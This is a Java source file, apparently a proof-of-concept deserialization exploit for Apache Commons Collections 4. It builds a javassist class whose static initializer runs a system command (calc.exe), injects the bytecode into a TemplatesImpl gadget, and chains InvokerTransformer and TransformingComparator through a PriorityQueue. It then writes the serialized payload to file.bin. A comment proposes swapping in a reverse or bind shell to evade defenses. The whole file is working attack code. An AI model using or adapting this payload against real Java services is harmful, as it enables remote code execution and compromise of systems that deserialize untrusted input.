package vul.ccbug;


import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import vul.util.*;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;


import java.io.File;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;


import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;


/**
 * @ClassName: demo
 * @Description: TODO
 * @Author: Samny
 * @Date: 2020/5/13 21:28
 * @Version: v1.0.0
 * @Description:
 **/
public class demo {





    public static void main(String[] args) throws Exception {

        String command = "calc.exe";
        Class tpl = TemplatesImpl.class;
        Object templates = tpl.newInstance();
        Class abstTranslet = AbstractTranslet.class;
        Class transFactory =  TransformerFactoryImpl.class;

        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Payload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        final CtClass clazz = pool.get(Payload.class.getName());
        // run command in static initializer
        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                "\");";
        clazz.makeClassInitializer().insertAfter(cmd);

        clazz.setName("Summer" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
                classBytes, ClassFiles.classAsBytes(Summer.class)
        });

        // required to make TemplatesImpl happy
        Field field = templates.getClass().getDeclaredField("_name");

        field.setAccessible(true);
        field.set(templates,"Summmer");
        Field field1 = templates.getClass().getDeclaredField("_tfactory");
        field1.setAccessible(true);
        field1.set(templates,transFactory.newInstance());


        InvokerTransformer transformer = new InvokerTransformer("toString",
                new Class[0], new Object[0]);
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2,
                new TransformingComparator(transformer));


        queue.add(templates);
        queue.add(new VerifyError("Summer"));

        Field field2 = transformer.getClass().getDeclaredField("iMethodName");
        field2.setAccessible(true);
        field2.set(transformer,"newTransformer");



        File file = new File("file.bin");
        FileOutputStream fos = new FileOutputStream(file);
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(queue);
        oos.flush();


    }


}
